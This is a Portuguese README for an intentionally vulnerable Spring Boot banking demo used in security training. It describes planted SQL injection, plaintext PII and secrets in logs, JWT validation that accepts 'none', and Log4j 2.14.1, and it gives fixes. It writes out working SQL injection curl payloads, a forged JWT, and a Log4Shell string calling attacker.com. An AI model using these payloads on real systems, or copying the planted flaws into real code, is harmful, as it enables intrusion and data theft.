# 🔴 Security Demo - Aplicação Bancária Vulnerável

## ⚠️ IMPORTANTE: APENAS PARA FINS EDUCATIVOS ⚠️

Esta aplicação Spring Boot foi desenvolvida **INTENCIONALMENTE** com vulnerabilidades de segurança para demonstrar problemas comuns em aplicações web e como atacantes podem explorá-los.

**🚫 NÃO USE EM PRODUÇÃO! 🚫**

## 📋 Cenário da Demo

**Aplicação**: Microsserviço Java/Spring Boot de transações bancárias

**Vulnerabilidades simuladas**:
- ✅ **SQL Injection** - Queries concatenadas permitindo extração de dados
- ✅ **PII em log** - CPF, senhas e dados financeiros expostos nos logs
- ✅ **JWT aceito sem revalidar claims** - Tokens inválidos são aceitos
- ✅ **Dependência vulnerável** - Log4j 2.14.1 (CVE-2021-44228)

**Demonstração de ataques funcionando**:
- 💥 SQL Injection retorna todos os saldos
- 💥 Log mostra CPF em claro
- 💥 Token manipulado acessa dados restritos
- 💥 Dependência vulnerável permite RCE

## 🚀 Como Executar

### Pré-requisitos
- Java 11+
- Maven 3.6+
- curl (para testes)
- jq (opcional, para formatação JSON)

### 1. Executar a aplicação
```bash
mvn spring-boot:run
```

A aplicação estará disponível em: `http://localhost:8080`

### 2. Verificar se está funcionando
```bash
curl http://localhost:8080/api/usuarios/listar
```

## 🎯 Demonstrações de Ataque

### 🔴 Execução Rápida - Menu Interativo
```bash
./scripts/executar_todos.sh
```

### 🔍 Scripts Individuais por Vulnerabilidade

#### 🎯 Script Principal (Menu Interativo)
```bash
./scripts/executar_todos.sh
```
**Funcionalidades:**
- Opção 1: Executar todas as demonstrações sequencialmente
- Opção 2: Executar demonstração específica
- Opção 3: Análise completa (resumo executivo)
- Verificação automática de conectividade
- Interface amigável com instruções

#### 🔍 Scripts Específicos por Vulnerabilidade

**1. SQL Injection** - `./scripts/1_sql_injection.sh`
- Extração de todos os saldos bancários
- Extração de todas as contas e transações
- Bypass de autenticação via login
- Análise técnica das queries vulneráveis

**2. PII em Logs** - `./scripts/2_pii_logs.sh`
- Geração de logs através de registro/login
- Logs de transferências bancárias
- Análise dos tipos de dados expostos
- Demonstração de vazamento de informações

**3. JWT Vulnerável** - `./scripts/3_jwt_vulneravel.sh`
- Token falsificado com algoritmo "none"
- Token com assinatura incorreta
- Token expirado aceito
- Análise técnica das falhas de validação

**4. Dados Expostos** - `./scripts/4_dados_expostos.sh`
- Listagem de usuários sem autenticação
- Exposição de contas bancárias e saldos
- Verificação de console H2 exposto
- Enumeração de endpoints sensíveis

**5. Dependência Vulnerável** - `./scripts/5_dependencia_vulneravel.sh`
- Verificação da versão Log4j vulnerável
- Simulação de payloads Log4Shell
- Análise do CVE-2021-44228
- Demonstração de vetores de ataque

### 🔍 Ataques Manuais

#### 1. SQL Injection - Extrair todos os saldos
```bash
curl -s "http://localhost:8080/api/contas/buscar-por-saldo/0%20OR%201=1%20--" | jq .
```

#### 2. SQL Injection - Extrair todas as contas
```bash
curl -s "http://localhost:8080/api/contas/buscar-por-numero/%27%20OR%20%271%27=%271" | jq .
```

#### 3. Exposição de dados - Listar usuários (CPFs e senhas)
```bash
curl -s "http://localhost:8080/api/usuarios/listar" | jq .
```

#### 4. JWT Vulnerável - Teste completo
```bash
./scripts/3_jwt_vulneravel.sh
```

### 📊 Dados de Teste Disponíveis

| CPF | Nome | Senha | Conta | Saldo |
|-----|------|-------|-------|--------|
| 12345678901 | João Silva | senha123 | 12345-6 | R$ 15.000,50 |
| 98765432100 | Maria Santos | minhasenha | 98765-4 | R$ 25.000,75 |
| 11122233344 | Carlos Admin | admin123 | 11111-1 | R$ 100.000,00 |

## 🔍 Vulnerabilidades Detalhadas

### 1. 💉 SQL Injection

**Localização**:
- `ContaBancariaRepository.java:21` - `findByNumeroContaVulneravel()`
- `ContaBancariaRepository.java:28` - `findContasComSaldoMaiorQue()`
- `UsuarioRepository.java:18` - `loginVulneravel()`
- `TransacaoRepository.java:16` - `findByTipoVulneravel()`

**Problema**: Queries SQL são construídas por concatenação de strings sem sanitização.

**Exploração**:
```sql
-- Query original
SELECT * FROM contas_bancarias WHERE numero_conta = 'USER_INPUT'

-- Com payload: ' OR '1'='1
SELECT * FROM contas_bancarias WHERE numero_conta = '' OR '1'='1'
-- Retorna TODOS os registros
```

**Endpoints vulneráveis**:
- `GET /api/contas/buscar-por-numero/{numeroConta}`
- `GET /api/contas/buscar-por-saldo/{saldoMinimo}`
- `GET /api/transacoes/buscar-por-tipo/{tipo}`
- `POST /api/auth/login`

### 2. 📝 PII em Logs

**Localização**:
- `UsuarioService.java:19` - Log de dados completos do usuário
- `TransacaoService.java:25` - Log de CPF em transferências
- `JwtUtil.java:23` - Log do JWT secret e token
- `DataInitializer.java:35` - Log de dados de inicialização

**Problema**: Informações pessoais (PII) são registradas em logs em texto claro.

**Dados expostos**:
- CPFs completos
- Senhas em texto claro
- Dados financeiros (saldos)
- Tokens JWT
- Emails e nomes

**Exemplo de log vulnerável**:
```
INFO - Criando usuário - CPF: 12345678901, Nome: João, Email: joao@email.com, Senha: senha123
INFO - Transferência - CPF: 12345678901 de conta 12345-6 para conta 98765-4 no valor de R$ 1000.00
DEBUG - Token JWT gerado: eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiVVNFUiI...
```

### 3. 🔑 JWT Inseguro

**Localização**:
- `JwtUtil.java:45` - `validateTokenInsecure()`
- `JwtUtil.java:58` - `extractAllClaimsInsecure()`
- `JwtAuthenticationFilter.java:45` - Validação insegura

**Problemas**:
- Aceita tokens com algoritmo "none"
- Não valida expiração adequadamente
- Aceita tokens com assinatura inválida
- Secret exposto nos logs

**Exploração**:
```javascript
// Token falsificado com algoritmo "none"
Header: {"alg":"none","typ":"JWT"}
Payload: {"role":"ADMIN","cpf":"99999999999","exp":9999999999}
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiQURNSU4iLCJjcGYiOiI5OTk5OTk5OTk5OSIsImV4cCI6OTk5OTk5OTk5OX0.
```

### 4. 📦 Dependência Vulnerável

**Localização**: `pom.xml:30`

**Problema**: Log4j versão 2.14.1 (vulnerável ao CVE-2021-44228 - Log4Shell)

**Exploração**:
```bash
# Payload LDAP injection (Log4Shell)
${jndi:ldap://attacker.com/exploit}
```

**Impacto**: Remote Code Execution (RCE)

### 5. 🔒 Configuração de Segurança Inadequada

**Localização**: `SecurityConfig.java:25`

**Problemas**:
- Endpoints sensíveis sem autenticação
- Headers de segurança desabilitados
- Senhas sem criptografia (PasswordEncoder customizado vulnerável)
- CSRF desabilitado
- Frames permitidos

## 🛡️ Como Corrigir as Vulnerabilidades

### 1. SQL Injection
```java
// ❌ Vulnerável
@Query(value = "SELECT * FROM usuarios WHERE cpf = '" + ":cpf" + "'", nativeQuery = true)

// ✅ Seguro
@Query("SELECT u FROM Usuario u WHERE u.cpf = :cpf")
```

### 2. PII em Logs
```java
// ❌ Vulnerável
logger.info("Login - CPF: {}, Senha: {}", cpf, senha);

// ✅ Seguro
logger.info("Login attempt for user with ID: {}", userId);
```

### 3. JWT Seguro
```java
// ✅ Validação adequada
public Boolean validateToken(String token) {
    try {
        Claims claims = Jwts.parser()
            .setSigningKey(secret)
            .parseClaimsJws(token)
            .getBody();
        return !claims.getExpiration().before(new Date());
    } catch (JwtException | IllegalArgumentException e) {
        return false;
    }
}
```

### 4. Dependência Atualizada
```xml
<!-- ✅ Versão segura -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.0</version>
</dependency>
```

## 📁 Estrutura do Projeto

```
security-demo/
├── src/main/java/com/demo/security/
│   ├── SecurityDemoApplication.java
│   ├── config/
│   │   ├── DataInitializer.java
│   │   ├── JwtAuthenticationFilter.java
│   │   ├── JwtUtil.java
│   │   └── SecurityConfig.java
│   ├── controller/
│   │   ├── AuthController.java
│   │   ├── ContaBancariaController.java
│   │   ├── TransacaoController.java
│   │   └── UsuarioController.java
│   ├── model/
│   │   ├── ContaBancaria.java
│   │   ├── Transacao.java
│   │   └── Usuario.java
│   ├── repository/
│   │   ├── ContaBancariaRepository.java
│   │   ├── TransacaoRepository.java
│   │   └── UsuarioRepository.java
│   └── service/
│       ├── TransacaoService.java
│       └── UsuarioService.java
├── scripts/
│   ├── executar_todos.sh (🎯 Menu principal)
│   ├── 1_sql_injection.sh
│   ├── 2_pii_logs.sh
│   ├── 3_jwt_vulneravel.sh
│   ├── 4_dados_expostos.sh
│   └── 5_dependencia_vulneravel.sh
└── README.md
```

## 🎓 Cenários de Uso Educativo

### Para Desenvolvedores
- Entender como vulnerabilidades são introduzidas
- Aprender a identificar problemas de segurança no código
- Praticar técnicas de code review focadas em segurança

### Para Pentesters
- Demonstrar impacto real de vulnerabilidades
- Praticar técnicas de exploração em ambiente controlado
- Criar relatórios de penetration testing

### Para DevSecOps
- Demonstrar importância de security scanning
- Mostrar como vulnerabilidades passam pelo pipeline
- Justificar implementação de gates de segurança

## 🚨 Avisos Legais

**⚠️ IMPORTANTE ⚠️**

- Esta aplicação é **INTENCIONALMENTE VULNERÁVEL**
- Use **APENAS** para fins educativos e de treinamento
- **NÃO EXPONHA** esta aplicação na internet
- **NÃO USE** este código como base para aplicações reais
- Os autores **NÃO SE RESPONSABILIZAM** por uso inadequado

## 📚 Recursos Adicionais

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Spring Security Documentation](https://spring.io/projects/spring-security)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

**Desenvolvido para demonstrar vulnerabilidades de segurança em aplicações web. Use com responsabilidade! 🛡️**